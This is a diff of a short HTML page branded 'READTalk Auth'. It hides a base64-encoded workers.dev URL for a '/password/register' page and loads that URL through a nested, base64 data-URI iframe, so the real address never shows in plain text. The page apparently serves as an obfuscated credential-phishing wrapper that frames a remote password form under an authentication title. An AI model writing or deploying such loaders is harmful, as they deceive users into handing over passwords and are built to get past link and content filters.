@@ -1,15 +1,16 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>READTalk - Log</title>
-<style>*{margin:0;padding:0}html,body{height:100%}iframe{width:100%;height:100%;border:0}</style>
+<html lang="id">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>READTalk Auth</title>
+<style>*{margin:0;padding:0}html,body,iframe{width:100%;height:100%}</style>
 </head>
 <body>
-<iframe id="a"></iframe>
+<iframe id="auth"></iframe>
 <script>
-const b='aHR0cHM6Ly9sb2cucmVhZHRhbGsud29ya2Vycy5kZXYvcGFzc3dvcmQvcmVnaXN0ZXI=';
+const b='aHR0cHM6Ly9sb2cucmVhZHRhbGsud29ya2Vycy5kZXYvcGFzc3dvcmQvcmVnaXN0ZXI='; //
 const h=atob(b);
 const p=`<iframe src="${h}" style="width:100%;height:100%;border:0"></iframe>`;
-document.getElementById('a').src='data:text/html;base64,'+btoa(p);
+document.getElementById('auth').src='data:text/html;base64,'+btoa(p);
 </script>
 </body>
 </html>
